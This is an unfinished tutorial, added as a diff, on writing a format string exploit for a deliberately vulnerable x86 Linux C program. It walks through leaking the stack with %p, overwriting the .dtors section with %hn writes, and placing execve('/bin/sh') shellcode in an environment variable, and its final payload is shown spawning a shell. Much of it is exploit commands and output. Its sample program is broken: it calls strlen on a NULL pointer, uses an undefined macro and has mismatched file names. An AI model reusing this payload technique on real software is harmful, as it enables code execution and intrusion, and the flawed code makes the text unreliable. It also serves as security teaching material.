@@ -1,0 +1,255 @@
+How to develop robust x86  stashed format string exploit code 
+			       by c0ntex | c0ntex[at]open-security.org
+					www.open-security.org
+		--------------------------------------------------------------
+
+*unfinished*
+
+
+
+Also see http://open-security.org/texts/7 - Further advances in format string exploitation
+
+
+
+Format string bugs are a method of abusing incorrect usage of the format functions like printf,
+sprintf, snprintf, fprintf, vfprintf and the likes. When these fucntions are called they require
+that a version specifier is used to display the data stored in one or more directives.
+
+During this document I will be using the printf function. From the man page we get the following:
+
+"
+#include <stdio.h>
+
+int printf(const char *format, ...);
+...
+The functions in the printf family produce output according to a format
+       as  described  below.  The functions printf and vprintf write output to
+       stdout, the standard output stream;"
+
+
+So to use the printf function, you must specify a format specifier to be printed to the stdout.
+Some of the common format specifiers used by printf:
+
+%c     The character format specifier.
+%d     The integer format specifier.
+%i     The integer format specifier (same as %d).
+%f     The floating-point format specifier.
+%s     The string format specifier.
+%u     The unsigned integer format specifier.
+%x     The unsigned hexadecimal format specifier.
+%p     Displays the corresponding argument that is a pointer.
+%n     Records the number of characters written so far.
+
+The ones we will use through this document are %p %u and %n / %hn
+
+%p will pop the next hex address
+%u will change a value to integer
+%n will perform 32 bit writes
+%hn will perform 16 bit writes
+
+
+The following is an example of how to use and how NOT to use this function:
+
+Correct usage of printf:
+-----------------------
+	char *string = "Error: Internal overflow"; 
+	printf("Something went wrong: %s\n", string);
+
+Incorrect usage of printf:
+-------------------------
+	char *string = "Error: Internal overflow"; 
+	printf(string);
+
+Incorrect usage of printf:
+-------------------------
+	printf("Hello, I am a function\n");  // This should use puts() instead.
+
+
+Ok, on with the exploitation, compile the following code and lets start to hack printf :-)
+
+/* fmt_string.c */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void usage(void);
+int main(int argc, char **argv);
+
+void usage(void)
+{
+        puts("Format string exploit example by c0ntex");
+        puts("Usage: ./fmt_string <user input>");
+        exit(EXIT_FAILURE);
+}
+
+int main(int argc, char **argv)
+{
+        char *buf = NULL;
+
+        if(argc != 2)
+         usage();
+
+        buf = malloc(strlen(buf));
+        if(!buf) {
+         perror("malloc");
+         exit(EXIT_FAILURE);
+        }
+
+        memcpy(buf, argv[1], BUFF -1);
+        buf[BUFF] = '\0';
+
+        printf(buf); printf("\n");
+
+        free(buf); buf = NULL;
+
+        return EXIT_SUCCESS;
+}
+
+
+[c0ntex@darkside /vuln_fmt]$ gcc -o fmt fmt.c -Wall -ansi -pedantic
+[c0ntex@darkside /vuln_fmt]$ ./fmt_string hello
+hello
+[c0ntex@darkside /vuln_fmt]$ ./fmt_string AAAA.%p
+AAAA.0xbffff9cf
+[c0ntex@darkside /vuln_fmt]$
+
+As you can see in the code, the printf function does not have a format specifier assigned, this
+is where the vulnerability lies, since we can now control how printf behaves. By passing a format
+specifier, we were able to display the contents of the stack as in a standard format string bug.
+Lets try and find our supplied string by popping more addresses:
+
+[c0ntex@darkside /vuln_fmt]$ ./fmt_string
+AAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
+%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
+%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.\(%p\).%p
+AAAAA.0xbffffadf.0x1f3.0x804831e.0x4200aec8.0x8049758.0xbffff9b8.0x420158d4.0x2.0xbffff9e4.
+0xbffff9f0.0x400124b8.0x2.0x80483b0.(nil).0x80483d1.0x8048490.0x2.0xbffff9e4.0x8048548.0x8048554.
+0x4000a950.0xbffff9dc.0x4001020c.0x2.0xbffffad9.0xbffffadf.(nil).0xbffffc02.0xbffffc14.0xbffffc1f.
+0xbffffc2f.0xbffffc3d.0xbffffc5e.0xbffffc71.0xbffffc8e.0xbffffc98.0xbffffe5b.0xbffffe69.0xbffffe83.
+0xbffffeec.0xbfffff01.0xbfffff0b.0xbfffff1c.0xbfffff4f.0xbfffff57.0xbfffff62.0xbfffff79.0xbfffff86.
+0xbfffffb7.0xbfffffd9.0xbfffffee.(nil).0x10.0x183f9ff.0x6.0x1000.0x11.0x64.0x3.0x8048034.0x4.0x20.
+0x5.0x6.0x7.0x4000000(nil).0x9.0x80483b0.0xb.(nil).0xc.(nil).0xd.(nil).0xe.(nil).0xf.0xbffffad4.
+(nil).(nil).(nil).(nil).0x36383669.0x662f2e00.0x4100746d.(0x41414141).0x2e70252e
+[c0ntex@darkside /vuln_fmt]$ 
+
+
+Ok, so we have found out format string which is (0x41414141), this is the 4 bytes we control,
+allowing us to write 4 bytes anywhere. Now we need to find an area that is writable in memory, by
+viewing  /proc/PDI/maps we can easily find somewhere:
+
+
+(gdb) shell cat /proc/30735/maps
+08048000-08049000 r-xp 00000000 03:07 32744      /root/fmt_string
+08049000-0804a000 rw-p 00000000 03:07 32744      /root/fmt_string
+ ^^^^^^^^^^^^^^^^^^^^^ --- This will do!
+40000000-40012000 r-xp 00000000 03:07 31947      /lib/ld-2.2.93.so
+40012000-40013000 rw-p 00012000 03:07 31947      /lib/ld-2.2.93.so
+4001d000-4001e000 rw-p 00000000 00:00 0
+42000000-42126000 r-xp 00000000 03:07 79848      /lib/i686/libc-2.2.93.so
+42126000-4212b000 rw-p 00126000 03:07 79848      /lib/i686/libc-2.2.93.so
+4212b000-4212f000 rw-p 00000000 00:00 0
+bfffe000-c0000000 rwxp fffff000 00:00 0
+(gdb)
+
+In this example, what we are going to do is overwrite the (DTORS) destructors, though we could use
+pretty much any location we like, lets find where:
+
+[c0ntex@darkside /vuln_fmt]$ objdump -h ./fmt_string | grep dtors
+ 18 .dtors        00000008  0804970c  0804970c  0000070c  2**2
+                            ^^^^^^^^
+We will use direct parameter access to make sure we are hitting the address pops correctly. Direct
+parameter access means we do not have to type multiple %p's to pop the address, we can go directly
+to the offset we require as show below:
+
+[c0ntex@darkside /vuln_fmt]$ ./fmt_string `printf "\x10\x97\x04\x08"`.%90\$x
+4971000
+[c0ntex@darkside /vuln_fmt]$
+
+90 pops from the base and we reach our target. From the output it is obvious that the padding we
+have is incorrect as we have lost 08 and gained NULLs at the end. We shall pad the address with a
+NOP to align the address:
+
+[c0ntex@darkside /vuln_fmt]$ ./fmt_string `printf "\x10\x97\x04\x08\x90"`.%90\$x
+.8049710
+[c0ntex@darkside /vuln_fmt]$
+
+Bingo!! We have the alignment right, lets try writing this address using (%n) format specifier and
+see how it impacts the program:
+
+[c0ntex@darkside /vuln_fmt]$ ./fmt_string `printf "\x10\x97\x04\x08\x90"`.%90\$n                        .
+Segmentation fault (core dumped)
+[c0ntex@darkside /vuln_fmt]$ gdb -q ./fmt_string -c ./core
+Core was generated by `./fmt_string.%90$n'.
+Program terminated with signal 11, Segmentation fault.
+Reading symbols from /lib/i686/libc.so.6...done.
+Loaded symbols for /lib/i686/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...done.
+Loaded symbols for /lib/ld-linux.so.2
+#0  0x00000006 in ?? ()
+(gdb) where
+#0  0x00000006 in ?? ()
+#1  0x0804859b in _fini ()
+#2  0x4202b162 in exit () from /lib/i686/libc.so.6
+#3  0x420158dc in __libc_start_main () from /lib/i686/libc.so.6
+(gdb) shell objdump -h ./fmt_string | grep dtors
+ 18 .dtors        00000008  0804970c  0804970c  0000070c  2**2
+(gdb) x/x 0x08049710
+0x8049710 <__DTOR_END__>:    0x00000006
+(gdb) q
+
+This looks good, we have made our code jump in to DTORS_END, now all we need to do is place the
+address of shellcode here and hopefully it will spawn us a shell. 
+
+[c0ntex@darkside /vuln_fmt]$ export EGG=`printf "\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\
+x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"`
+[c0ntex@darkside /vuln_fmt]$ ./code/getenv EGG
+
+[-] Environment variable [$EGG] is at [0xbffffc45]
+[-] Environment variable is set to [1�1�Ph//shh/bin�PS�1Ұ
+                                                          �]
+
+[c0ntex@darkside /vuln_fmt]$
+
+Next thing we have to do is write the address of the shellcode into DTORS_END so when fmt_string
+jumps there and the program terminates, our code will be executed. To do this we use the (%u)
+format specifier. The first thing we need to do is break the address of the shellocde into two
+sections so we can split the writes. We will write the last half of the address to 0x08049710
+and the second half to 0x08049712.
+
+After again fixing alignment we come up with the following:
+
+[c0ntex@darkside /vuln_fmt]$ ./fmt_string `printf "\x10\x97\x04\x08\x12\x97\x04\x08\x90"`%92\$p%93\$p
+0x80497100x8049712
+
+Perfect, lets calculate the addressing for our 0xbffffc45 shellcode address:
+
+[c0ntex@darkside /vuln_fmt]$ pcalc 0xfc45-9	// -9 subtracts the 9 bytes for target address's
+        64572     0xfc3c     0y1111110000111101
+[c0ntex@darkside /vuln_fmt]$ pcalc 0x1bfff-64572 
+        50113     0xc3c2     0y1100001111000010
+[c0ntex@darkside /vuln_fmt]$
+
+Write 1 - Loc: 0x08049710 Content: 64573 = fc45
+Write 2 - Loc: 0x08049712 Content: 50114 = 1bfff // We have to loop around to align the value
+
+We have all the information we need, the final string we will use to exploit this bug is:
+
+	\x10\x97\x04\x08"\x12\x97\x04\x08 + %.64573u%90\$hn + %.50114u%92\$hn
+
+which will perform the two short writes, placing our shellcode address. Lets test it!
+
+[c0ntex@darkside /vuln_fmt]$ ./fmt_string `printf "\x10\x97\x04\x08\x12\x97\x04\x08"`%.64573u%90\$hn%.50114u%92\$hn
+000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+....
+....
+000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+00000000000000000000000000000000000000000000000000000000000000000000000000sh-3.00$
+
+Perfect, it worked a treat. We have just exploited a format string bug where the user. I hope this text has been useful
+for you.
+
+
+EOF
+
+
